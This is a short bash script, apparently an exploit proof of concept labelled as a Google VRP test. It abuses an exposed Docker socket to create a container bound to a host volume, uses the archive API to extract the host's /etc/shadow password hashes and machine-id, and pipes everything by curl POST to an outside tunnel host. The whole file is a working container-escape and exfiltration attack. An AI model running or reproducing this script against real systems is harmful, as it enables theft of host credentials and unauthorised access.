#!/bin/bash
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE VRP: DIRECT VOLUME SIPHON ==="
  
  # 1. We know this image exists from your last log
  IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"

  # 2. Create the container (This usually succeeds even if 'Start' fails)
  # We bind the host root to /host_data inside this dummy container
  RESP=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}")
  
  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$ID" ]; then
    echo "[+] Dummy Container ID: $ID"
    echo "--- [!] EXTRACTING HOST SHADOW FILE (ENCRYPTED PASSWORDS) ---"
    
    # THE MAGIC: We use the ARCHIVE API. 
    # This doesn't require the container to be RUNNING. It just reads the filesystem.
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/shadow" | tar -xO
    
    echo -e "\n--- [!] EXTRACTING HOST MACHINE-ID ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/machine-id" | tar -xO

    # Cleanup
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
  else
    echo "ERROR: Could not create dummy container. Response: $RESP"
  fi
  echo "=== [!] SIPHON COMPLETE ==="
} | curl -s -X POST --data-binary @- "https://$URL"
